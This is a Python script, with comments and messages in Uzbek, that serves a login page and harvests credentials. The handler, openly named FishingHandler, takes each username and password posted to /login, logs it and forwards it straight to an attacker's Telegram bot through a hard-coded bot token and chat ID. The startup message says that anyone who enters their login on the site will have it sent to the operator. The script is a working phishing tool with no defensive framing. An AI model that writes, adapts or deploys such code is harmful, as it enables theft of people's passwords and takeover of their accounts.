import urllib.request
import urllib.parse
import json
import logging
from http.server import HTTPServer, SimpleHTTPRequestHandler

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

# --- BOT SOZLAMALARI ---
TOKEN = "8459595520:AAFJyE39f0Utvoe7gWZ00OWgTrXaZR89OIw"
CHAT_ID = "2023319584"

def send_to_telegram(username, password):
    text = f"🔥 Saytdan yangi ma'lumot keldi!\n\n👤 Login: {username}\n🔑 Parol: {password}"
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': text}
    
    try:
        req = urllib.request.Request(url, data=urllib.parse.urlencode(payload).encode(), method='POST')
        urllib.request.urlopen(req)
        logging.info("Telegramga xabar muvaffaqiyatli yuborildi!")
    except Exception as e:
        logging.error(f"Xatolik: Telegramga xabar yuborib bo'lmadi! Token va Chat ID to'g'riligini tekshiring. Xato turi: {e}")

class FishingHandler(SimpleHTTPRequestHandler):
    # Fayllarni uzatish (masalan: index.html saytini brauzerga ko'rsatish)
    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        return super().do_GET()

    # Saytdagi formadan ma'lumot qabul qilish
    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode('utf-8'))
                username = data.get('username', '')
                password = data.get('password', '')
                
                logging.info(f"Olingan login va parol: {username} / {password}")
                
                # Olingan ma'lumotni darhol Telegram bot orqali yuborish
                send_to_telegram(username, password)
                
                # Saytga "muvaffaqiyatli qabul qilindi" deb javob qaytarish
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success"}).encode())
                
            except json.JSONDecodeError:
                self.send_response(400)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

def run(port=8080):
    server_address = ('', port)
    httpd = HTTPServer(server_address, FishingHandler)
    print("=" * 50)
    print(f"🤖 Bot va Veb-server ishga tushdi!")
    print(f"🌐 Sayt manzili: http://localhost:{port}")
    print("👉 Kimdir shu saytda ism-parolini kiritsa, sizning Telegramingizga keladi!")
    print("=" * 50)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nServer to'xtatildi.")
        httpd.server_close()

if __name__ == '__main__':
    run()